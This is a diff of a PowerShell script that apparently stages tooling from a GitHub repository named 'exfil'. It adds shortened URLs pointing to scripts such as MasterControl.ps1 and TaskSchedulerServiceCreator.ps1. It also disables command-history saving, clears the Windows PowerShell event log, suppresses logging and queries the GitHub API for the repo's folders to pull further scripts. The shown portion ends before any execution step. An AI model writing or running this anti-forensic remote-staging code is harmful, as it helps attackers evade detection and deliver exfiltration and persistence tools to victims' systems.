@@ -1,21 +1,20 @@
-# === Setup ===
-$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
-foreach ($tlsProtocol in $AvailableTls) {
-    [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol
-}
+#URLS
+https://tinyurl.com/exfilmc <> MasterControl.ps1
+https://tinyurl.com/exfilpins <> AutomatedTaskWithPingInstall.ps1
+https://tinyurl.com/exfilvins <> TaskSchedulerServiceCreator.ps1
+https://tinyurl.com/exfilactivation <> ActivationWithAutomatedInstall.ps1
 
+#Variables
+$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
+foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
 Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
 Clear-EventLog "Windows Powershell"
 $LogEngineLifecycleEvent = $false | Out-Null
 [void]$LogEngineLifecycleEvent
-
-# === GitHub Repo Info ===
 $owner = "sempiampi"
 $repo = "exfil"
 $branch = "main"
 $uri = "https://api.github.com/repos/$owner/$repo/contents"
-
-# === Get top-level contents ===
 $response = Invoke-RestMethod -Uri $uri -Headers @{ "User-Agent" = "PowerShell" }
 $folders = $response | Where-Object { $_.type -eq "dir" }
 
